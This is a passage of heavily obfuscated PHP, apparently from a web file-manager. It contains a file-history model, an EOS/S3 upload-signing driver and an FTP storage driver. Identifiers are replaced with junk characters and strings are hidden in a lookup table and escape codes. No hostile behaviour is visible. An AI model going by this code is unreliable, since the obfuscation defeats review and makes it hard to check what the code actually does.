$–£˜í†›) : $–£˜í†›; $í›¾ñ“í = $í›¾ñ“í <= 0 ? 0 : $í›¾ñ“í - 1; if ($í›¾ñ“í >= 500) { return; } $ºš°Àş = array($•¹ƒ´[455] => $½¯Ú—Ó£); $³½šâº³ = $this->field($•¹ƒ´[2106])->where($ºš°Àş)->order($•¹ƒ´[2100])->select(); if (!$³½šâº³ || $í›¾ñ“í >= count($³½šâº³)) { return; } $Â…ï½¸Á = array_to_keyvalue($³½šâº³, $•¹ƒ´[12], $•¹ƒ´[437]); $Â…ï½¸Á = array_slice($Â…ï½¸Á, $í›¾ñ“í); $Šƒ·şì = array_to_keyvalue($³½šâº³, $•¹ƒ´[12], $•¹ƒ´[506]); $Šƒ·şì = array_slice($Šƒ·şì, $í›¾ñ“í); if (!$Â…ï½¸Á || !$Šƒ·şì) { return; } $ºš°Àş = array($•¹ƒ´[457] => array($•¹ƒ´[7], $Â…ï½¸Á)); $this->where($ºš°Àş)->delete(); Model($•¹ƒ´[509])->remove($Šƒ·şì); } public function listData($²ª¨ßüï) { $à£¶şÒ¢ =& $_SERVER[¹òÍ›æş]; $óªßñéæ = array($à£¶şÒ¢[455] => $²ª¨ßüï); $ùÛé®ôş = $à£¶şÒ¢[2107]; $îˆœÔè = $this->field($ùÛé®ôş)->where($óªßñéæ)->order($à£¶şÒ¢[2100])->selectPage(); $this->_listAppendUser($îˆœÔè[$à£¶şÒ¢[407]]); $¨¤ç×âÇ = Model($à£¶şÒ¢[800])->get($à£¶şÒ¢[1266]); $¨—îğ› = 5; if ($¨¤ç×âÇ == $à£¶şÒ¢[1267]) { $îˆœÔè[$à£¶şÒ¢[407]] = array_slice($îˆœÔè[$à£¶şÒ¢[407]], 0, $¨—îğ›); $îˆœÔè[$à£¶şÒ¢[404]] = array($à£¶şÒ¢[2108] => 1, $à£¶şÒ¢[2109] => 20, $à£¶şÒ¢[2110] => 1, $à£¶şÒ¢[2111] => count($îˆœÔè[$à£¶şÒ¢[407]])); } return $îˆœÔè; } protected function _listAppendUser(&$µÂ€Ç÷‘) { $—¦­€Â“ =& $_SERVER[¹òÍ›æş]; $öíÂöúè = array_to_keyvalue($µÂ€Ç÷‘, $—¦­€Â“[12], $—¦­€Â“[1669]); $©…ÌøàÀ = Model($—¦­€Â“[563])->userListInfo($öíÂöúè); foreach ($µÂ€Ç÷‘ as &$÷û¡œü—) { $öôí¹ÜÛ = $÷û¡œü—[$—¦­€Â“[1669]]; $÷û¡œü—[$—¦­€Â“[492]] = $©…ÌøàÀ[$öôí¹ÜÛ] ? $©…ÌøàÀ[$öôí¹ÜÛ] : !1; } unset($÷û¡œü—); } public function fileInfo($‚²‚Ë¥Ê) { $ß¿òõËÓ =& $_SERVER[¹òÍ›æş]; $€Ğ÷Â§® = $this->tablePrefix; $øçöÉÛ• = "{$€Ğ÷Â§®}\151\157\137\146\151\154\145\x20\x66\x69\154\x65\163\x20\x6f\x6e\x20\x66\x69\x6c\x65\x73\56\146\151\x6c\x65\x49\104\x20\x3d\x20\x68\151\163\164\x6f\162\x79\56\x66\x69\154\145\x49\x44"; return $this->alias($ß¿òõËÓ[2112])->where(array($ß¿òõËÓ[457] => $‚²‚Ë¥Ê))->join($øçöÉÛ•, $ß¿òõËÓ[2113])->find(); } public function removeItem($ùµ¡·©) { $“®ş–ï =& $_SERVER[¹òÍ›æş]; $¼Òú´Á™ = array($“®ş–ï[457] => $ùµ¡·©); $¯ª¸»“ù = $this->where($¼Òú´Á™)->find(); if ($¯ª¸»“ù) { $Ë¡ä• = $this->where($¼Òú´Á™)->delete(); Model($“®ş–ï[509])->remove($¯ª¸»“ù[$“®ş–ï[506]]); return $Ë¡ä•; } return !1; } public function removeBySource($©Û®ò”å) { $´®ÓŸÉÖ =& $_SERVER[¹òÍ›æş]; if (!$©Û®ò”å) { return !1; } if (!is_array($©Û®ò”å)) { $©Û®ò”å = array($©Û®ò”å); } $¦ÙÈôçê = array($´®ÓŸÉÖ[455] => array($´®ÓŸÉÖ[7], $©Û®ò”å)); $ƒâ‡º²Ù = $this->field($´®ÓŸÉÖ[507])->where($¦ÙÈôçê)->select(); if ($ƒâ‡º²Ù) { $this->where($¦ÙÈôçê)->delete(); $Ş§ö ãó = array_to_keyvalue($ƒâ‡º²Ù, $´®ÓŸÉÖ[12], $´®ÓŸÉÖ[506]); Model($´®ÓŸÉÖ[509])->remove($Ş§ö ãó); } return !0; } public function setDetail($Ç×ºÜµÉ, $£¿—Óİ¿) { $éë„ÑŸô =& $_SERVER[¹òÍ›æş]; return $this->where(array($éë„ÑŸô[457] => $Ç×ºÜµÉ))->save(array($éë„ÑŸô[2103] => $£¿—Óİ¿)); } public function rollbackToItem($Œü¹Ù½, $Æ„ëã£©) { $ÑÕ÷…ú» =& $_SERVER[¹òÍ›æş]; $¼š‡Ü÷é = Model($ÑÕ÷…ú»[855])->sourceInfo($Œü¹Ù½); $this->addHistory($¼š‡Ü÷é, LNG($ÑÕ÷…ú»[2114])); $Ú±íÉ÷É = $this->find($Æ„ëã£©); $õÛõÚÕÍ = array($ÑÕ÷…ú»[506] => $Ú±íÉ÷É[$ÑÕ÷…ú»[506]], $ÑÕ÷…ú»[86] => $Ú±íÉ÷É[$ÑÕ÷…ú»[86]], $ÑÕ÷…ú»[95] => time(), $ÑÕ÷…ú»[494] => USER_ID); Model($ÑÕ÷…ú»[855])->where(array($ÑÕ÷…ú»[440] => $Œü¹Ù½))->save($õÛõÚÕÍ); return $this->where(array($ÑÕ÷…ú»[457] => $Æ„ëã£©))->delete(); } public function clearSame($¨œæ‹€æ) { $Á‡ÍåÌ =& $_SERVER[¹òÍ›æş]; $¼´¿£¶Á = $this->listData($¨œæ‹€æ); $¹¶ÛÚä = array_to_keyvalue_group($¼´¿£¶Á, $Á‡ÍåÌ[506]); $µ‘‘˜şú = array(); $ÍŞÚàŸ = array(); foreach ($¹¶ÛÚä as $Ùö‹¡Ö÷) { if (!$Ùö‹¡Ö÷ || count($Ùö‹¡Ö÷) <= 1) { continue; } foreach ($Ùö‹¡Ö÷ as $ş¶¹ºÛí) { $µ‘‘˜şú[] = $ş¶¹ºÛí[$Á‡ÍåÌ[506]]; $ÍŞÚàŸ[] = $ş¶¹ºÛí[$Á‡ÍåÌ[437]]; } } if (!$ÍŞÚàŸ) { return; } $this->where(array($Á‡ÍåÌ[437] => array($Á‡ÍåÌ[7], $ÍŞÚàŸ)))->delete(); Model($Á‡ÍåÌ[509])->remove($µ‘‘˜şú); } public function userSpace() { $ßÓ¡§„¥ =& $_SERVER[¹òÍ›æş]; $Ïî†ô¬ = $this->tablePrefix; $Ÿ°•úÂ = array($ßÓ¡§„¥[1660] => USER_ID); $¢‘û¾ò¬ = "{$Ïî†ô¬}\x69\x6f\x5f\x66\x69\154\x65\x20\146\151\x6c\145\163\40\157\156\40\146\x69\154\x65\163\56\x66\151\154\145\111\104\40\x3d\x20\x68\x69\163\164\157\x72\171\x2e\146\151\x6c\x65\111\104"; return $this->alias($ßÓ¡§„¥[2112])->where($Ÿ°•úÂ)->join($¢‘û¾ò¬, $ßÓ¡§„¥[2113])->sum($ßÓ¡§„¥[86]); } } goto eÔçí‰®Ï; AŒ¿ëºÕÈ‹: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($îé·üˆÁ) { parent::__construct($îé·üˆÁ); $this->signatureVersion($_SERVER[¹òÍ›æş][226]); } public function uploadFormData($²ŠàÓ™š, $Åø¦ŒÆÃ = 3600) { $ò‡ÁÈ½Š =& $_SERVER[¹òÍ›æş]; $€µ¹ïŒ = $ò‡ÁÈ½Š[209]; $ÔÕÚ”ë = $ò‡ÁÈ½Š[247]; $ë‘£ßçù = $ò‡ÁÈ½Š[72]; $‚—åÍÓÖ = gmdate($ò‡ÁÈ½Š[248]); $é¢ùñ• = gmdate($ò‡ÁÈ½Š[249]); $·Ë¬ü“ = $ò‡ÁÈ½Š[250]; $¬½ıÏ°ª = $Åø¦ŒÆÃ . $ò‡ÁÈ½Š[12]; $æ¹’¼¯Æ = $ò‡ÁÈ½Š[251]; $ïÆ‰‰˜­ = array($this->accessKey, $é¢ùñ•, $this->region, $ë‘£ßçù, $·Ë¬ü“); $µòİÃ¯Ê = implode($ò‡ÁÈ½Š[8], $ïÆ‰‰˜­); $Ëçù¼ıÊ = array($ò‡ÁÈ½Š[252] => gmdate($ò‡ÁÈ½Š[1352], strtotime($ò‡ÁÈ½Š[254])), $ò‡ÁÈ½Š[255] => array(array($ò‡ÁÈ½Š[256] => $this->bucket), array($ò‡ÁÈ½Š[257] => $€µ¹ïŒ), array($ò‡ÁÈ½Š[258], $ò‡ÁÈ½Š[259], $ò‡ÁÈ½Š[12]), array($ò‡ÁÈ½Š[258], $ò‡ÁÈ½Š[260], $ò‡ÁÈ½Š[12]), array($ò‡ÁÈ½Š[258], $ò‡ÁÈ½Š[261], $ò‡ÁÈ½Š[12]), array($ò‡ÁÈ½Š[262] => $æ¹’¼¯Æ), array($ò‡ÁÈ½Š[263] => $µòİÃ¯Ê), array($ò‡ÁÈ½Š[264] => $ÔÕÚ”ë), array($ò‡ÁÈ½Š[265] => $‚—åÍÓÖ), array($ò‡ÁÈ½Š[266] => $¬½ıÏ°ª))); $è´…áº = base64_encode(json_encode($Ëçù¼ıÊ)); $ÉŒè¾³å = hash_hmac($ò‡ÁÈ½Š[267], $é¢ùñ•, $ò‡ÁÈ½Š[268] . $this->secret, !0); $ÖÕı¶Éå = hash_hmac($ò‡ÁÈ½Š[267], $this->region, $ÉŒè¾³å, !0); $ÜùÑ›úï = hash_hmac($ò‡ÁÈ½Š[267], $ë‘£ßçù, $ÖÕı¶Éå, !0); $çšşÈù¦ = hash_hmac($ò‡ÁÈ½Š[267], $·Ë¬ü“, $ÜùÑ›úï, !0); $ÊÁ¹•ñò = hash_hmac($ò‡ÁÈ½Š[267], $è´…áº, $çšşÈù¦); $¶âÉ¬  = array($ò‡ÁÈ½Š[225] => $ò‡ÁÈ½Š[12], $ò‡ÁÈ½Š[269] => $ò‡ÁÈ½Š[12], $ò‡ÁÈ½Š[257] => $€µ¹ïŒ, $ò‡ÁÈ½Š[262] => $æ¹’¼¯Æ, $ò‡ÁÈ½Š[270] => $è´…áº, $ò‡ÁÈ½Š[271] => $µòİÃ¯Ê, $ò‡ÁÈ½Š[272] => $ÔÕÚ”ë, $ò‡ÁÈ½Š[273] => $‚—åÍÓÖ, $ò‡ÁÈ½Š[274] => $¬½ıÏ°ª, $ò‡ÁÈ½Š[275] => $ÊÁ¹•ñò, $ò‡ÁÈ½Š[192] => $this->getHost()); return $¶âÉ¬ ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($²×úÈÔ¤) { parent::__construct(); if (count($²×úÈÔ¤) > 0) { $this->_init($²×úÈÔ¤); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($„˜º«Ö¨) { $òöÎ·© =& $_SERVER[¹òÍ›æş]; global $config; $this->appCharset = $config[$òöÎ·©[1379]]; $this->systemCharset = $config[$òöÎ·©[1380]]; if (isset($„˜º«Ö¨[$òöÎ·©[1381]]) && $„˜º«Ö¨[$òöÎ·©[1381]]) { $this->systemCharset = $„˜º«Ö¨[$òöÎ·©[1381]]; } } public function iconvApp($—¥ŠˆÏ) { return $this->iconvTo($—¥ŠˆÏ, $this->systemCharset, $this->appCharset); } public function iconvSystem($¢«ã—æÔ) { return $this->iconvTo($¢«ã—æÔ, $this->appCharset, $this->systemCharset); } public function getPathOuter($ú¬„Ô¬¥) { $¬‘ç‹Øô =& $_SERVER[¹òÍ›æş]; $ŠÔ·ùµ± = $this->iconvApp($this->pathBase); $ú¬„Ô¬¥ = $this->iconvApp($ú¬„Ô¬¥); if (substr($ŠÔ·ùµ±, 0, 2) == $¬‘ç‹Øô[1305]) { $ŠÔ·ùµ± = BASIC_PATH . substr($ŠÔ·ùµ±, 2); } if (substr($ú¬„Ô¬¥, 0, 2) == $¬‘ç‹Øô[1305]) { $ú¬„Ô¬¥ = BASIC_PATH . substr($ú¬„Ô¬¥, 2); } $ŠÔ·ùµ± = KodIO::clear($ŠÔ·ùµ±); $ú¬„Ô¬¥ = KodIO::clear($ú¬„Ô¬¥); $ú¬„Ô¬¥ = substr($ú¬„Ô¬¥, strlen($ŠÔ·ùµ±)); if (empty($this->pathDriver)) { return $ú¬„Ô¬¥; } return $this->pathDriver . $¬‘ç‹Øô[8] . ltrim($ú¬„Ô¬¥, $¬‘ç‹Øô[8]); } private function _init($¹‚ÂÊñú = array()) { $Ñ÷È½Á =& $_SERVER[¹òÍ›æş]; if (!function_exists($Ñ÷È½Á[1382])) { throw new Exception(LNG($Ñ÷È½Á[1383])); } $this->config = $¹‚ÂÊñú; $this->charsetReset($¹‚ÂÊñú); foreach ($¹‚ÂÊñú as $¯¦„ğç => $èîÇÙõ) { if (isset($this->{$¯¦„ğç})) { $this->{$¯¦„ğç} = $èîÇÙõ; } } return $this->_login($¹‚ÂÊñú); } private function _login($¤Šİù¢¨) { $åôÁ¤§ =& $_SERVER[¹òÍ›æş]; static $Ê’ŸÉ°É = array(); $»ñã—Ó  = md5(json_encode($¤Šİù¢¨)); if (isset($Ê’ŸÉ°É[$»ñã—Ó ])) { foreach ($Ê’ŸÉ°É[$»ñã—Ó ] as $¤³Â‘— => $Ì§† ö…) { $this->{$¤³Â‘—} = $Ì§† ö…; } return !0; } $¬¡àºö¶ = parse_url(trim($this->server, $åôÁ¤§[8])); $this->host = $¬¡àºö¶[$åôÁ¤§[192]]; $¬·‚…‹¶ = isset($¬¡àºö¶[$åôÁ¤§[191]]) && $¬¡àºö¶[$åôÁ¤§[191]] == $åôÁ¤§[1384] ? !0 : !1; $this->scheme = $¬·‚…‹¶ ? $åôÁ¤§[1385] : $åôÁ¤§[1386]; $this->port = isset($¬¡àºö¶[$åôÁ¤§[193]]) ? $¬¡àºö¶[$åôÁ¤§[193]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Æ™İÀŸÉ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Ó†ÙŸê = $this->pasv == $åôÁ¤§[98] ? !0 : !1; @ftp_pasv($this->connect, $Ó†ÙŸê); $Ê’ŸÉ°É[$»ñã—Ó ] = array($åôÁ¤§[1387] => $this->connect, $åôÁ¤§[192] => $this->host, $åôÁ¤§[191] => $this->scheme, $åôÁ¤§[193] => $this->port); return $Æ™İÀŸÉ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($™Ï¨¼“ê, $ÙÉÃşê÷ = '', $Ââ®²ò’ = REPEAT_RENAME) { if ($this->setContent($™Ï¨¼“ê, $ÙÉÃşê÷)) { return $this->getPathOuter($™Ï¨¼“ê); } return !1; } public function mkdir($ı‡§òÒ•, $äßäÀó = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ı‡§òÒ• = $this->iconvSystem($ı‡§òÒ•); if ($this->_isFolder($ı‡§òÒ•) || @ftp_mkdir($this->connect, $ı‡§òÒ•)) { return $this->getPathOuter($ı‡§òÒ•); } if (!$this->mkdir($this->pathFather($ı‡§òÒ•))) { return !1; } if ($ı‡§òÒ• = @ftp_mkdir($this->connect, $ı‡§òÒ•)) { return $this->getPathOuter($ı‡§òÒ•); } return !1; } public function copyFile($‰í­ï€¾, $íÆÉØÙ) { if (!$this->_isconn()) { return !1; } $ìü¨øğ = $this->pathThis($this->iconvSystem($‰í­ï€¾)); $×™–ìı° = $this->tempFile($ìü¨øğ); $–§ÀâÙÒ = $this->iconvApp($×™–ìı°); $this->download($‰í­ï€¾, $–§ÀâÙÒ); $——ºÇù = $this->upload($íÆÉØÙ, $–§ÀâÙÒ); $this->tempFileRemve($×™–ìı°); return $——ºÇù; } public function moveFile($ô‰è´Œ®, $°Ø¨İªà) { if (!$this->_isconn()) { return !1; } $ô‰è´Œ® = $this->iconvSystem($ô‰è´Œ®); $°Ø¨İªà = $this->iconvSystem($°Ø¨İªà); $ÚÇ’ÍöŸ = @ftp_rename($this->connect, $ô‰è´Œ®, $°Ø¨İªà); return $ÚÇ’ÍöŸ ? $this->getPathOuter($°Ø¨İªà) : !1; } public function delFile($ï¼Û€­“) { if (!$this->_isconn()) { return !1; } $ï¼Û€­“ = $this->iconvSystem($ï¼Û€­“); return @ftp_delete($this->connect, $ï¼Û€­“); } public function delFolder($û‘¬í›º) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $“™³„ó = $ü”«¬à = array(); $this->fileList($û‘¬í›º, $“™³„ó, $ü”«¬à, !0); $this->listItemCache = !0; foreach ($ü”«¬à as $œ¹ÖŞ) { $ˆ¡ÙÌÅ€ = $this->iconvSystem($œ¹ÖŞ[$_SERVER[¹òÍ›æş][32]]); $¾¸Ûß¡— = @ftp_delete($this->connect, $ˆ¡ÙÌÅ€); if (!$¾¸Ûß¡—) { return !1; } } foreach ($“™³„ó as $ˆ¡ÙÌÅ€) { $ˆ¡ÙÌÅ€ = $this->iconvSystem($ˆ¡ÙÌÅ€); $¾¸Ûß¡— = @ftp_rmdir($this->connect, $ˆ¡ÙÌÅ€); if (!$¾¸Ûß¡—) { return !1; } } $û‘¬í›º = $this->iconvSystem($û‘¬í›º); return @ftp_rmdir($this->connect, $û‘¬í›º); } public function rename($´Àëùæß, $ôĞ‹Û˜ü) { $–ë¨œı =& $_SERVER[¹òÍ›æş]; if (!$this->_isconn()) { return !1; } $¸¯Î Õú = $this->fileNameAuto($this->pathFather($´Àëùæß), $ôĞ‹Û˜ü); $¸¯Î Õú = $this->iconvSystem($¸¯Î Õú); $´Àëùæß = $this->iconvSystem($´Àëùæß); $İºŸî‰ã = $this->pathFather($´Àëùæß); $ÑŠÒ›¹ü = rtrim($İºŸî‰ã, $–ë¨œı[8]) . $–ë¨œı[8] . $¸¯Î Õú; $ù™Ï¤Ì = @ftp_rename($this->connect, $´Àëùæß, $ÑŠÒ›¹ü); $ÑŠÒ›¹ü = $this->iconvApp($ÑŠÒ›¹ü); return $ù™Ï¤Ì ? $this->getPathOuter($ÑŠÒ›¹ü) : !1; } private function folderInfo($¦òıœÏæ, $¾‡ÇÆã = false) { $ƒ¾ßæüË =& $_SERVER[¹òÍ›æş]; $é—ı«¨ = array($ƒ¾ßæüË[32] => $this->pathThis($¦òıœÏæ), $ƒ¾ßæüË[94] => $this->getPathOuter($ƒ¾ßæüË[8] . $¦òıœÏæ), $ƒ¾ßæüË[33] => $ƒ¾ßæüË[85]); if ($¾‡ÇÆã) { return $é—ı«¨; } $é—ı«¨[$ƒ¾ßæüË[211]] = $é—ı«¨[$ƒ¾ßæüË[95]] = 0; $é—ı«¨[$ƒ¾ßæüË[212]] = $é—ı«¨[$ƒ¾ßæüË[213]] = !0; return $é—ı«¨; } private function fileInfo($ä—ÜµòŒ, $³ºìõÀ = false, $š¬ƒ÷Æ = array()) { $„Õ×£Æñ =& $_SERVER[¹òÍ›æş]; $Ü‡âºÏ = array($„Õ×£Æñ[32] => $this->pathThis($ä—ÜµòŒ), $„Õ×£Æñ[94] => $this->getPathOuter($„Õ×£Æñ[8] . $ä—ÜµòŒ), $„Õ×£Æñ[33] => $„Õ×£Æñ[210], $„Õ×£Æñ[86] => isset($š¬ƒ÷Æ[$„Õ×£Æñ[86]]) ? $š¬ƒ÷Æ[$„Õ×£Æñ[86]] : 0, $„Õ×£Æñ[184] => $this->ext($ä—ÜµòŒ)); if ($³ºìõÀ) { return $Ü‡âºÏ; } $Ü‡âºÏ[$„Õ×£Æñ[211]] = $Ü‡âºÏ[$„Õ×£Æñ[95]] = 0; $Ü‡âºÏ[$„Õ×£Æñ[212]] = $Ü‡âºÏ[$„Õ×£Æñ[213]] = !0; $®ÑçíşÌ = $this->iconvSystem($ä—ÜµòŒ); $Ü‡âºÏ[$„Õ×£Æñ[95]] = @ftp_mdtm($this->connect, $®ÑçíşÌ); if (empty($š¬ƒ÷Æ)) { $š¬ƒ÷Æ = $this->objectMeta($ä—ÜµòŒ); if (!$š¬ƒ÷Æ) { return $Ü‡âºÏ; } } $Ü‡âºÏ[$„Õ×£Æñ[86]] = $š¬ƒ÷Æ[$„Õ×£Æñ[86]]; return $Ü‡âºÏ; } public function size($ÀıÃ¬¡ä) { $î®Ãšåœ = $this->objectMeta($ÀıÃ¬¡ä); return $î®Ãšåœ ? $î®Ãšåœ[$_SERVER[¹òÍ›æş][86]] : 0; } public function info($÷º¨Çê) { if ($this->isFile($÷º¨Çê)) { return $this->fileInfo($÷º¨Çê, 0); } else { if ($this->isFolder($÷º¨Çê)) { return $this->folderInfo($÷º¨Çê); } } return !1; } private function fileList($ôïªğ¢Ú, &$µÕªî‚‡, &$Ñ…î×ó, $”î“²ÈÓ = false) { $Ğ×‘•‹ =& $_SERVER[¹òÍ›æş]; $ôïªğ¢Ú = $this->iconvSystem($ôïªğ¢Ú); if (!$this->isFolder($ôïªğ¢Ú)) { return !1; } @ftp_chdir($this->connect, $Ğ×‘•‹[8]); $ôïªğ¢Ú = rtrim($ôïªğ¢Ú, $Ğ×‘•‹[8]) . $Ğ×‘•‹[8]; check_abort(); $Æ«¹Ü¼Í = @ftp_rawlist($this->connect, $ôïªğ¢Ú); if (!$Æ«¹Ü¼Í) { $Æ«¹Ü¼Í = array(); } $ÏÒœ¥°– = array($Ğ×‘•‹[10] => 1, $Ğ×‘•‹[1306] => 1); foreach ($Æ«¹Ü¼Í as $Òƒó’”é) { $ëÂ˜¤»î = $this->_listItem($Òƒó’”é); if ($ëÂ˜¤»î[0] == $Ğ×‘•‹[788]) { continue; } $ª†ÂÅĞè = $ëÂ˜¤»î[8]; if (empty($ª†ÂÅĞè) && $ª†ÂÅĞè !== $Ğ×‘•‹[208] || isset($ÏÒœ¥°–[$ª†ÂÅĞè])) { continue; } $ª†ÂÅĞè = $this->iconvApp($ôïªğ¢Ú . ltrim($ª†ÂÅĞè, $Ğ×‘•‹[8])); $¹Å‘ªõÕ = array($Ğ×‘•‹[32] => $ª†ÂÅĞè, $Ğ×‘•‹[33] => $Ğ×‘•‹[210], $Ğ×‘•‹[86] => $ëÂ˜¤»î[4]); if (substr($Òƒó’”é, 0, 1) == $Ğ×‘•‹[1388]) { $¹Å‘ªõÕ[$Ğ×‘•‹[33]] = $Ğ×‘•‹[85]; $¹Å‘ªõÕ[$Ğ×‘•‹[86]] = 0; } $ÌéÃèü¢ = $¹Å‘ªõÕ[$Ğ×‘•‹[33]] == $Ğ×‘•‹[85] ? !0 : !1; $this->cacheMethodInfoSet($ª†ÂÅĞè, $ÌéÃèü¢, $¹Å‘ªõÕ); if ($ÌéÃèü¢) { $µÕªî‚‡[] = $ª†ÂÅĞè; if ($”î“²ÈÓ) { $this->fileList($ª†ÂÅĞè, $µÕªî‚‡, $Ñ…î×ó, $”î“²ÈÓ); } continue; } $Ñ…î×ó[] = $¹Å‘ªõÕ; } $this->cacheMethodInfoSet($ôïªğ¢Ú, !0); } private function _listItem($ËÖ Õı) { if (empty($ËÖ Õı)) { return array(); } $ğÖÊìÜ¡ = preg_split($_SERVER[¹òÍ›æş][1389], $ËÖ Õı); if (count($ğÖÊìÜ¡) <= 9) { return $ğÖÊìÜ¡; } $ğÖÊìÜ¡[8] = trim(substr($ËÖ Õı, strpos($ËÖ Õı, $ğÖÊìÜ¡[7]) + strlen($ğÖÊìÜ¡[7]))); return array_splice($ğÖÊìÜ¡, 0, 9); } public function listPath($Ä’½·Ó, $Íó‰î‹ß = false) { $øÌ£Œû¯ =& $_SERVER[¹òÍ›æş]; if (!$this->_isconn()) { return !1; } $àÈ¼ˆĞª = $âòÓ³ú = array(); $this->fileList($Ä’½·Ó, $àÈ¼ˆĞª, $âòÓ³ú); foreach ($àÈ¼ˆĞª as $áî¯Ë®Œ => $©¬‡áÄ¯) { $àÈ¼ˆĞª[$áî¯Ë®Œ] = $this->folderInfo($©¬‡áÄ¯, $Íó‰î‹ß); } foreach ($âòÓ³ú as $áî¯Ë®Œ => $©¬‡áÄ¯) { $âòÓ³ú[$áî¯Ë®Œ] = $this->fileInfo($©¬‡áÄ¯[$øÌ£Œû¯[32]], $Íó‰î‹ß, $©¬‡áÄ¯); } return array($øÌ£Œû¯[92] => $àÈ¼ˆĞª, $øÌ£Œû¯[93] => $âòÓ³ú); } public function has($Ã˜ÕÇ±, $Ä«Ê¯Áš = false, $¹ÔÄ’µŞ = true) { $ÑÓ¡ı®Î =& $_SERVER[¹òÍ›æş]; $Õ”„ß‰Û = $ç½¼”˜Æ = array(); $âŸ­˜œÆ = $Ä«Ê¯Áš ? !0 : !1; $this->fileList($Ã˜ÕÇ±, $Õ”„ß‰Û, $ç½¼”˜Æ, $âŸ­˜œÆ); if ($Ä«Ê¯Áš) { return array($ÑÓ¡ı®Î[217] => count($ç½¼”˜Æ), $ÑÓ¡ı®Î[218] => count($Õ”„ß‰Û)); } if ($¹ÔÄ’µŞ) { if (count($ç½¼”˜Æ)) { return !0; } } else { if (count($Õ”„ß‰Û)) { return !0; } } return !1; } public function listAll($£ø‰×ƒ) { $Íâ¸¼«„ =& $_SERVER[¹òÍ›æş]; if (!$this->_isconn()) { return !1; } $Úğ — = $ÎÁ¾ºêø = array(); $this->fileList($£ø‰×ƒ, $Úğ —, $ÎÁ¾ºêø, !0); $öÄœ€¬š = array_to_keyvalue($ÎÁ¾ºêø, $Íâ¸¼«„[32]); foreach ($Úğ — as $ÉéøÓ™) { if (is_string($ÉéøÓ™)) { $öÄœ€¬š[$ÉéøÓ™] = array($Íâ¸¼«„[86] => 0); } } return $this->listAllFiles($£ø‰×ƒ, $öÄœ€¬š); } public function getContent($’ÃˆéÓ) { if (!$this->_isconn()) { return !1; } $’ÃˆéÓ = $this->iconvSystem($’ÃˆéÓ); return $this->fileSubstr($’ÃˆéÓ); } public function setContent($«ãÖŠÑÆ, $ê´ì·Ä€ = '') { if (!$this->_isconn()) { return !1; } $¿ùş®Àî = $this->pathThis($this->iconvSystem($«ãÖŠÑÆ)); $úœŸ÷“¼ = $this->tempFile($¿ùş®Àî); file_put_contents($úœŸ÷“¼, $ê´ì·Ä€); $’Øû°§× = $this->upload($«ãÖŠÑÆ, $this->iconvApp($úœŸ÷“¼)); $this->tempFileRemve($úœŸ÷“¼); return $’Øû°§×; } public function fileSubstr($ê†ˆÑ¬ß, $»¤êßŒæ = 0, $ìœË¬è = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ê†ˆÑ¬ß, $»¤êßŒæ, $ìœË¬è); } private function ftpRequest($ŸóËŒÈı, $š­±àÈæ = 0, $ÉÇèÌö” = false) { $ŸóËŒÈı = $this->iconvSystem($ŸóËŒÈı); $ìÌÂ—Ää = $this->scheme . $this->host . $_SERVER[¹òÍ›æş][4] . $this->port; $‰Éˆ¢³â = curl_init(); curl_setopt($‰Éˆ¢³â, CURLOPT_URL, $ìÌÂ—Ää . $this->pathEncode($ŸóËŒÈı)); curl_setopt($‰Éˆ¢³â, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ÉÇèÌö”) { $›¶²€Ø = $š­±àÈæ + $ÉÇèÌö” - 1; curl_setopt($‰Éˆ¢³â, CURLOPT_RANGE, "{$š­±àÈæ}\55{$›¶²€Ø}"); } curl_setopt($‰Éˆ¢³â, CURLOPT_RETURNTRANSFER, 1); $†„ŸÛÖ  = curl_exec($‰Éˆ¢³â); curl_close($‰Éˆ¢³â); return $†„ŸÛÖ ; } public function upload($àƒ‘óÑ», $®œ¤»—Ğ, $»ğú“Ş = false, $³àúÒ“ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($àƒ‘óÑ»))) { return !1; } $àƒ‘óÑ» = $this->iconvSystem($àƒ‘óÑ»); $®œ¤»—Ğ = $this->iconvSystem($®œ¤»—Ğ); $ˆ•·ËŒ = ftp_nb_put($this->connect, $àƒ‘óÑ», $®œ¤»—Ğ, FTP_BINARY); while ($ˆ•·ËŒ == FTP_MOREDATA) { $ˆ•·ËŒ = ftp_nb_continue($this->connect); } if ($ˆ•·ËŒ != FTP_FINISHED) { return !1; } return $this->getPathOuter($àƒ‘óÑ»); } public function download($õÊ±è–¼, $»ÊøÄÖ½ = '') { if (!$this->_isconn()) { return !1; } $ÙŞÕÁóÕ = $this->pathFather($»ÊøÄÖ½); if (!IO::mkdir($ÙŞÕÁóÕ)) { return !1; } $õÊ±è–¼ = $this->iconvSystem($õÊ±è–¼); $»ÊøÄÖ½ = $this->iconvSystem($»ÊøÄÖ½); $Öû²Æü = ftp_nb_get($this->connect, $»ÊøÄÖ½, $õÊ±è–¼, FTP_BINARY); while ($Öû²Æü == FTP_MOREDATA) { $Öû²Æü = ftp_nb_continue($this->connect); } if ($Öû²Æü != FTP_FINISHED) { return !1; } return $this->iconvApp($»ÊøÄÖ½); } public function exist($Ò¶â—©ü) { return $this->isFile($Ò¶â—©ü) || $this->isFolder($Ò¶â—©ü); } public function isFile($¨±²ô¹®) { return !$this->isFolder($¨±²ô¹®) && $this->objectMeta($¨±²ô¹®); } public function isFolder($´¨»¬‚) { return $this->cacheMethod($_SERVER[¹òÍ›æş][175], $´¨»¬‚); } protected function objectMeta($â¤±Òë) { return $this->cacheMethod($_SERVER[¹òÍ›æş][177], $â¤±Òë); } protected function _objectMeta($‹ø€’) { $ºÙáÑ ø =& $_SERVER[¹òÍ›æş]; if ($‹ø€’ == $ºÙáÑ ø[12] || $‹ø€’ == $ºÙáÑ ø[8]) { return array(); } if (!$this->_isconn()) { return !1; } $‹ø€’ = 